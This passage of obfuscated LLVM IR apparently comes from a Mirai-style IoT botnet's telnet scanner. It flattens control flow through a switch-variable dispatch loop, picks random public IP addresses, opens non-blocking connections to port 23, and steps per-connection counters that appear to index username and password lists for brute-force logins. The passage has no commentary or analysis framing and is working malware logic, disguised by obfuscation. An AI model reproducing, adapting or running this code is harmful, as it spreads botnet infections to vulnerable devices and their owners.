  br label %loopEnd

; <label>:23:                                     ; preds = %loopEntry
  %.reload192 = load i32, i32* %.reg2mem191
  store i32 %.reload192, i32* %1, align 4
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %24, align 4
  %25 = call zeroext i16 @htons(i16 zeroext 23) #13
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %25, i16* %26, align 2
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %28 = getelementptr inbounds [8 x i8], [8 x i8]* %27, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %28, i8 0, i64 8, i32 4, i1 false)
  %29 = load i32, i32* %1, align 4
  %30 = zext i32 %29 to i64
  %31 = call i8* @llvm.stacksave()
  store i8* %31, i8** %9, align 8
  %32 = alloca %struct.telstate_t, i64 %30, align 16
  store %struct.telstate_t* %32, %struct.telstate_t** %.reg2mem18
  %.reload179 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %33 = bitcast %struct.telstate_t* %.reload179 to i8*
  %34 = load i32, i32* %1, align 4
  %35 = sext i32 %34 to i64
  %36 = mul i64 %35, 5
  call void @llvm.memset.p0i8.i64(i8* %33, i8 0, i64 %36, i32 16, i1 false)
  store i32 0, i32* %2, align 4
  store i32 2104945780, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %2, align 4
  %39 = load i32, i32* %1, align 4
  %40 = icmp slt i32 %38, %39
  %41 = select i1 %40, i32 100776713, i32 -611762432
  store i32 %41, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i32, i32* %2, align 4
  %44 = sext i32 %43 to i64
  %.reload178 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %45 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload178, i64 %44
  %46 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %45, i32 0, i32 3
  store i8 1, i8* %46, align 1
  %47 = call noalias i8* @malloc(i64 1024) #2
  %48 = load i32, i32* %2, align 4
  %49 = sext i32 %48 to i64
  %.reload177 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %50 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload177, i64 %49
  %51 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %50, i32 0, i32 8
  store i8* %47, i8** %51, align 8
  %52 = load i32, i32* %2, align 4
  %53 = sext i32 %52 to i64
  %.reload176 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %54 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload176, i64 %53
  %55 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %54, i32 0, i32 8
  %56 = load i8*, i8** %55, align 8
  call void @llvm.memset.p0i8.i64(i8* %56, i8 0, i64 1024, i32 1, i1 false)
  store i32 379279422, i32* %switchVar
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = load i32, i32* %2, align 4
  %59 = add nsw i32 %58, 1
  store i32 %59, i32* %2, align 4
  store i32 2104945780, i32* %switchVar
  br label %loopEnd

; <label>:60:                                     ; preds = %loopEntry
  %61 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 0
  store i64 5, i64* %61, align 8
  %62 = getelementptr inbounds %struct.timeval, %struct.timeval* %10, i32 0, i32 1
  store i64 0, i64* %62, align 8
  store i32 -697128831, i32* %switchVar
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  store i32 -1314709689, i32* %switchVar
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -1990651907, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  %67 = load i32, i32* %1, align 4
  %68 = icmp slt i32 %66, %67
  %69 = select i1 %68, i32 -1913512431, i32 -1657164727
  store i32 %69, i32* %switchVar
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i32, i32* %2, align 4
  %72 = sext i32 %71 to i64
  %.reload175 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %73 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload175, i64 %72
  %74 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %73, i32 0, i32 2
  %75 = load i8, i8* %74, align 8
  %76 = zext i8 %75 to i32
  store i32 %76, i32* %.reg2mem180
  store i32 12046569, i32* %switchVar
  br label %loopEnd

NodeBlock15:                                      ; preds = %loopEntry
  %.reload190 = load volatile i32, i32* %.reg2mem180
  %Pivot16 = icmp slt i32 %.reload190, 4
  %77 = select i1 %Pivot16, i32 641790664, i32 1776961603
  store i32 %77, i32* %switchVar
  br label %loopEnd

NodeBlock13:                                      ; preds = %loopEntry
  %.reload185 = load volatile i32, i32* %.reg2mem180
  %Pivot14 = icmp slt i32 %.reload185, 6
  %78 = select i1 %Pivot14, i32 -2076718687, i32 1131842236
  store i32 %78, i32* %switchVar
  br label %loopEnd

NodeBlock11:                                      ; preds = %loopEntry
  %.reload183 = load volatile i32, i32* %.reg2mem180
  %Pivot12 = icmp slt i32 %.reload183, 7
  %79 = select i1 %Pivot12, i32 593353473, i32 1972332518
  store i32 %79, i32* %switchVar
  br label %loopEnd

NodeBlock9:                                       ; preds = %loopEntry
  %.reload182 = load volatile i32, i32* %.reg2mem180
  %Pivot10 = icmp slt i32 %.reload182, 8
  %80 = select i1 %Pivot10, i32 1844374457, i32 -1528136132
  store i32 %80, i32* %switchVar
  br label %loopEnd

LeafBlock7:                                       ; preds = %loopEntry
  %.reload181 = load volatile i32, i32* %.reg2mem180
  %SwitchLeaf8 = icmp eq i32 %.reload181, 8
  %81 = select i1 %SwitchLeaf8, i32 -1561553475, i32 -195535381
  store i32 %81, i32* %switchVar
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload184 = load volatile i32, i32* %.reg2mem180
  %Pivot6 = icmp slt i32 %.reload184, 5
  %82 = select i1 %Pivot6, i32 1459210137, i32 -1418949054
  store i32 %82, i32* %switchVar
  br label %loopEnd

NodeBlock3:                                       ; preds = %loopEntry
  %.reload189 = load volatile i32, i32* %.reg2mem180
  %Pivot4 = icmp slt i32 %.reload189, 2
  %83 = select i1 %Pivot4, i32 -340077843, i32 1237049388
  store i32 %83, i32* %switchVar
  br label %loopEnd

NodeBlock1:                                       ; preds = %loopEntry
  %.reload186 = load volatile i32, i32* %.reg2mem180
  %Pivot2 = icmp slt i32 %.reload186, 3
  %84 = select i1 %Pivot2, i32 943636615, i32 -863952088
  store i32 %84, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload188 = load volatile i32, i32* %.reg2mem180
  %Pivot = icmp slt i32 %.reload188, 1
  %85 = select i1 %Pivot, i32 -2009072250, i32 1220165356
  store i32 %85, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload187 = load volatile i32, i32* %.reg2mem180
  %SwitchLeaf = icmp eq i32 %.reload187, 0
  %86 = select i1 %SwitchLeaf, i32 -735080750, i32 -195535381
  store i32 %86, i32* %switchVar
  br label %loopEnd

; <label>:87:                                     ; preds = %loopEntry
  %88 = load i32, i32* %2, align 4
  %89 = sext i32 %88 to i64
  %.reload174 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %90 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload174, i64 %89
  %91 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %90, i32 0, i32 8
  %92 = load i8*, i8** %91, align 8
  call void @llvm.memset.p0i8.i64(i8* %92, i8 0, i64 1024, i32 1, i1 false)
  %93 = load i32, i32* %2, align 4
  %94 = sext i32 %93 to i64
  %.reload173 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %95 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload173, i64 %94
  %96 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %95, i32 0, i32 3
  %97 = load i8, i8* %96, align 1
  %98 = icmp ne i8 %97, 0
  %99 = select i1 %98, i32 -236434822, i32 1138162952
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = load i32, i32* %2, align 4
  %102 = sext i32 %101 to i64
  %.reload172 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %103 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload172, i64 %102
  %104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %103, i32 0, i32 8
  %105 = load i8*, i8** %104, align 8
  store i8* %105, i8** %11, align 8
  %106 = load i32, i32* %2, align 4
  %107 = sext i32 %106 to i64
  %.reload171 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %108 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload171, i64 %107
  %109 = bitcast %struct.telstate_t* %108 to i8*
  call void @llvm.memset.p0i8.i64(i8* %109, i8 0, i64 32, i32 16, i1 false)
  %110 = load i8*, i8** %11, align 8
  %111 = load i32, i32* %2, align 4
  %112 = sext i32 %111 to i64
  %.reload170 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %113 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload170, i64 %112
  %114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %113, i32 0, i32 8
  store i8* %110, i8** %114, align 8
  %115 = call i32 @getRandomPublicIP()
  %116 = load i32, i32* %2, align 4
  %117 = sext i32 %116 to i64
  %.reload169 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %118 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload169, i64 %117
  %119 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %118, i32 0, i32 1
  store i32 %115, i32* %119, align 4
  store i32 -500986995, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = load i32, i32* %2, align 4
  %122 = sext i32 %121 to i64
  %.reload168 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %123 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload168, i64 %122
  %124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %123, i32 0, i32 5
  %125 = load i8, i8* %124, align 1
  %126 = add i8 %125, 1
  store i8 %126, i8* %124, align 1
  %127 = load i32, i32* %2, align 4
  %128 = sext i32 %127 to i64
  %.reload167 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %129 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload167, i64 %128
  %130 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %129, i32 0, i32 5
  %131 = load i8, i8* %130, align 1
  %132 = zext i8 %131 to i64
  %133 = icmp eq i64 %132, 26
  %134 = select i1 %133, i32 1392333764, i32 515986318
  store i32 %134, i32* %switchVar
  br label %loopEnd

; <label>:135:                                    ; preds = %loopEntry
  %136 = load i32, i32* %2, align 4
  %137 = sext i32 %136 to i64
  %.reload166 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %138 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload166, i64 %137
  %139 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %138, i32 0, i32 5
  store i8 0, i8* %139, align 1
  %140 = load i32, i32* %2, align 4
  %141 = sext i32 %140 to i64
  %.reload165 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %142 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload165, i64 %141
  %143 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %142, i32 0, i32 4
  %144 = load i8, i8* %143, align 2
  %145 = add i8 %144, 1
  store i8 %145, i8* %143, align 2
  store i32 515986318, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  %147 = load i32, i32* %2, align 4
  %148 = sext i32 %147 to i64
  %.reload164 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %149 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload164, i64 %148
  %150 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %149, i32 0, i32 4
  %151 = load i8, i8* %150, align 2
  %152 = zext i8 %151 to i64
  %153 = icmp eq i64 %152, 19
  %154 = select i1 %153, i32 659824931, i32 729259410
  store i32 %154, i32* %switchVar
  br label %loopEnd

; <label>:155:                                    ; preds = %loopEntry
  %156 = load i32, i32* %2, align 4
  %157 = sext i32 %156 to i64
  %.reload163 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %158 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload163, i64 %157
  %159 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %158, i32 0, i32 3
  store i8 1, i8* %159, align 1
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:160:                                    ; preds = %loopEntry
  store i32 -500986995, i32* %switchVar
  br label %loopEnd

; <label>:161:                                    ; preds = %loopEntry
  %162 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  store i16 2, i16* %162, align 4
  %163 = call zeroext i16 @htons(i16 zeroext 23) #13
  %164 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  store i16 %163, i16* %164, align 2
  %165 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  %166 = getelementptr inbounds [8 x i8], [8 x i8]* %165, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %166, i8 0, i64 8, i32 4, i1 false)
  %167 = load i32, i32* %2, align 4
  %168 = sext i32 %167 to i64
  %.reload162 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %169 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload162, i64 %168
  %170 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %169, i32 0, i32 1
  %171 = load i32, i32* %170, align 4
  %172 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  %173 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %172, i32 0, i32 0
  store i32 %171, i32* %173, align 4
  %174 = call i32 @socket(i32 2, i32 1, i32 0) #2
  %175 = load i32, i32* %2, align 4
  %176 = sext i32 %175 to i64
  %.reload161 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %177 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload161, i64 %176
  %178 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %177, i32 0, i32 0
  store i32 %174, i32* %178, align 16
  %179 = load i32, i32* %2, align 4
  %180 = sext i32 %179 to i64
  %.reload160 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %181 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload160, i64 %180
  %182 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %181, i32 0, i32 0
  %183 = load i32, i32* %182, align 16
  %184 = bitcast %struct.timeval* %10 to i8*
  %185 = call i32 @setsockopt(i32 %183, i32 1, i32 20, i8* %184, i32 16) #2
  %186 = load i32, i32* %2, align 4
  %187 = sext i32 %186 to i64
  %.reload159 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %188 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload159, i64 %187
  %189 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %188, i32 0, i32 0
  %190 = load i32, i32* %189, align 16
  %191 = bitcast %struct.timeval* %10 to i8*
  %192 = call i32 @setsockopt(i32 %190, i32 1, i32 21, i8* %191, i32 16) #2
  %193 = load i32, i32* %2, align 4
  %194 = sext i32 %193 to i64
  %.reload158 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %195 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload158, i64 %194
  %196 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %195, i32 0, i32 0
  %197 = load i32, i32* %196, align 16
  %198 = icmp eq i32 %197, -1
  %199 = select i1 %198, i32 -1057887565, i32 313996798
  store i32 %199, i32* %switchVar
  br label %loopEnd

; <label>:200:                                    ; preds = %loopEntry
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:201:                                    ; preds = %loopEntry
  %202 = load i32, i32* %2, align 4
  %203 = sext i32 %202 to i64
  %.reload157 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %204 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload157, i64 %203
  %205 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %204, i32 0, i32 0
  %206 = load i32, i32* %205, align 16
  %207 = load i32, i32* %2, align 4
  %208 = sext i32 %207 to i64
  %.reload156 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %209 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload156, i64 %208
  %210 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %209, i32 0, i32 0
  %211 = load i32, i32* %210, align 16
  %212 = call i32 (i32, i32, ...) @fcntl(i32 %211, i32 3, i8* null)
  %213 = or i32 %212, 2048
  %214 = call i32 (i32, i32, ...) @fcntl(i32 %206, i32 4, i32 %213)
  %215 = load i32, i32* %2, align 4
  %216 = sext i32 %215 to i64
  %.reload155 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %217 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload155, i64 %216
  %218 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %217, i32 0, i32 0
  %219 = load i32, i32* %218, align 16
  %220 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %221 = call i32 @connect(i32 %219, %struct.sockaddr* %220, i32 16)
  %222 = icmp eq i32 %221, -1
  %223 = select i1 %222, i32 -1946243896, i32 -1019922968
  store i32 %223, i32* %switchVar
  br label %loopEnd

; <label>:224:                                    ; preds = %loopEntry
  %225 = call i32* @__errno_location() #13
  %226 = load i32, i32* %225, align 4
  %227 = icmp ne i32 %226, 115
  %228 = select i1 %227, i32 557556498, i32 -1019922968
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = load i32, i32* %2, align 4
  %231 = sext i32 %230 to i64
  %.reload154 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %232 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload154, i64 %231
  %233 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %232, i32 0, i32 0
  %234 = load i32, i32* %233, align 16
  %235 = call i32 @sclose(i32 %234)
  %236 = load i32, i32* %2, align 4
  %237 = sext i32 %236 to i64
  %.reload153 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %238 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload153, i64 %237
  %239 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %238, i32 0, i32 3
  store i8 1, i8* %239, align 1
  store i32 1003208940, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = load i32, i32* %2, align 4
  %242 = sext i32 %241 to i64
  %.reload152 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %243 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload152, i64 %242
  %244 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %243, i32 0, i32 2
  store i8 1, i8* %244, align 8
  %245 = load i32, i32* %2, align 4
  %246 = sext i32 %245 to i64
  %.reload151 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %247 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload151, i64 %246
  %248 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %247, i32 0, i32 6
  store i32 0, i32* %248, align 4
  store i32 1003208940, i32* %switchVar
  br label %loopEnd

; <label>:249:                                    ; preds = %loopEntry
  store i32 1729329605, i32* %switchVar
  br label %loopEnd

; <label>:250:                                    ; preds = %loopEntry
  %251 = load i32, i32* %2, align 4
  %252 = sext i32 %251 to i64
  %.reload150 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %253 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload150, i64 %252
  %254 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %253, i32 0, i32 6
  %255 = load i32, i32* %254, align 4
  %256 = icmp eq i32 %255, 0
  %257 = select i1 %256, i32 -1305709895, i32 858705714
  store i32 %257, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %260 = load i32, i32* %2, align 4
  %261 = sext i32 %260 to i64
  %.reload149 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %262 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload149, i64 %261
  %263 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %262, i32 0, i32 6
  store i32 %259, i32* %263, align 4
  store i32 858705714, i32* %switchVar
  br label %loopEnd

; <label>:264:                                    ; preds = %loopEntry
  store i32 1753808057, i32* %switchVar
  br label %loopEnd

; <label>:265:                                    ; preds = %loopEntry
  %266 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %267 = getelementptr inbounds [16 x i64], [16 x i64]* %266, i64 0, i64 0
  %268 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %267) #2, !srcloc !5
  %269 = extractvalue { i64, i64* } %268, 0
  %270 = extractvalue { i64, i64* } %268, 1
  %271 = trunc i64 %269 to i32
  store i32 %271, i32* %12, align 4
  %272 = ptrtoint i64* %270 to i64
  %273 = trunc i64 %272 to i32
  store i32 %273, i32* %13, align 4
  store i32 1693151921, i32* %switchVar
  br label %loopEnd

; <label>:274:                                    ; preds = %loopEntry
  store i32 33112631, i32* %switchVar
  br label %loopEnd

; <label>:275:                                    ; preds = %loopEntry
  %276 = load i32, i32* %2, align 4
  %277 = sext i32 %276 to i64
  %.reload148 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %278 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload148, i64 %277
  %279 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %278, i32 0, i32 0
  %280 = load i32, i32* %279, align 16
  %281 = srem i32 %280, 64
  %282 = zext i32 %281 to i64
  %283 = shl i64 1, %282
  %284 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i32 0, i32 0
  %285 = load i32, i32* %2, align 4
  %286 = sext i32 %285 to i64
  %.reload147 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %287 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload147, i64 %286
  %288 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %287, i32 0, i32 0
  %289 = load i32, i32* %288, align 16
  %290 = sdiv i32 %289, 64
  %291 = sext i32 %290 to i64
  %292 = getelementptr inbounds [16 x i64], [16 x i64]* %284, i64 0, i64 %291
  %293 = load i64, i64* %292, align 8
  %294 = or i64 %293, %283
  store i64 %294, i64* %292, align 8
  %295 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 0
  store i64 0, i64* %295, align 8
  %296 = getelementptr inbounds %struct.timeval, %struct.timeval* %5, i32 0, i32 1
  store i64 10000, i64* %296, align 8
  %297 = load i32, i32* %2, align 4
  %298 = sext i32 %297 to i64
  %.reload146 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %299 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload146, i64 %298
  %300 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %299, i32 0, i32 0
  %301 = load i32, i32* %300, align 16
  %302 = add nsw i32 %301, 1
  %303 = call i32 @select(i32 %302, %struct.__sigset_t* null, %struct.__sigset_t* %4, %struct.__sigset_t* null, %struct.timeval* %5)
  store i32 %303, i32* %3, align 4
  %304 = load i32, i32* %3, align 4
  %305 = icmp eq i32 %304, 1
  %306 = select i1 %305, i32 -1107482554, i32 662002981
  store i32 %306, i32* %switchVar
  br label %loopEnd

; <label>:307:                                    ; preds = %loopEntry
  store i32 4, i32* %6, align 4
  store i32 0, i32* %7, align 4
  %308 = load i32, i32* %2, align 4
  %309 = sext i32 %308 to i64
  %.reload145 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %310 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload145, i64 %309
  %311 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %310, i32 0, i32 0
  %312 = load i32, i32* %311, align 16
  %313 = bitcast i32* %7 to i8*
  %314 = call i32 @getsockopt(i32 %312, i32 1, i32 4, i8* %313, i32* %6) #2
  %315 = load i32, i32* %7, align 4
  %316 = icmp ne i32 %315, 0
  %317 = select i1 %316, i32 646440784, i32 -1384286302
  store i32 %317, i32* %switchVar
  br label %loopEnd

; <label>:318:                                    ; preds = %loopEntry
  %319 = load i32, i32* %2, align 4
  %320 = sext i32 %319 to i64
  %.reload144 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %321 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload144, i64 %320
  %322 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %321, i32 0, i32 0
  %323 = load i32, i32* %322, align 16
  %324 = call i32 @sclose(i32 %323)
  %325 = load i32, i32* %2, align 4
  %326 = sext i32 %325 to i64
  %.reload143 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %327 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload143, i64 %326
  %328 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %327, i32 0, i32 2
  store i8 0, i8* %328, align 8
  %329 = load i32, i32* %2, align 4
  %330 = sext i32 %329 to i64
  %.reload142 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %331 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload142, i64 %330
  %332 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %331, i32 0, i32 3
  store i8 1, i8* %332, align 1
  store i32 1486175026, i32* %switchVar
  br label %loopEnd

; <label>:333:                                    ; preds = %loopEntry
  %334 = load i32, i32* %2, align 4
  %335 = sext i32 %334 to i64
  %.reload141 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %336 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload141, i64 %335
  %337 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %336, i32 0, i32 0
  %338 = load i32, i32* %337, align 16
  %339 = load i32, i32* %2, align 4
  %340 = sext i32 %339 to i64
  %.reload140 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %341 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload140, i64 %340
  %342 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %341, i32 0, i32 0
  %343 = load i32, i32* %342, align 16
  %344 = call i32 (i32, i32, ...) @fcntl(i32 %343, i32 3, i8* null)
  %345 = and i32 %344, -2049
  %346 = call i32 (i32, i32, ...) @fcntl(i32 %338, i32 4, i32 %345)
  %347 = load i32, i32* %2, align 4
  %348 = sext i32 %347 to i64
  %.reload139 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %349 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload139, i64 %348
  %350 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %349, i32 0, i32 6
  store i32 0, i32* %350, align 4
  %351 = load i32, i32* %2, align 4
  %352 = sext i32 %351 to i64
  %.reload138 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %353 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload138, i64 %352
  %354 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %353, i32 0, i32 7
  store i16 0, i16* %354, align 16
  %355 = load i32, i32* %2, align 4
  %356 = sext i32 %355 to i64
  %.reload137 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %357 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload137, i64 %356
  %358 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %357, i32 0, i32 8
  %359 = load i8*, i8** %358, align 8
  call void @llvm.memset.p0i8.i64(i8* %359, i8 0, i64 1024, i32 1, i1 false)
  %360 = load i32, i32* %2, align 4
  %361 = sext i32 %360 to i64
  %.reload136 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %362 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload136, i64 %361
  %363 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %362, i32 0, i32 2
  store i8 2, i8* %363, align 8
  store i32 794347618, i32* %switchVar
  br label %loopEnd

; <label>:364:                                    ; preds = %loopEntry
  store i32 -1818707963, i32* %switchVar
  br label %loopEnd

; <label>:365:                                    ; preds = %loopEntry
  %366 = load i32, i32* %3, align 4
  %367 = icmp eq i32 %366, -1
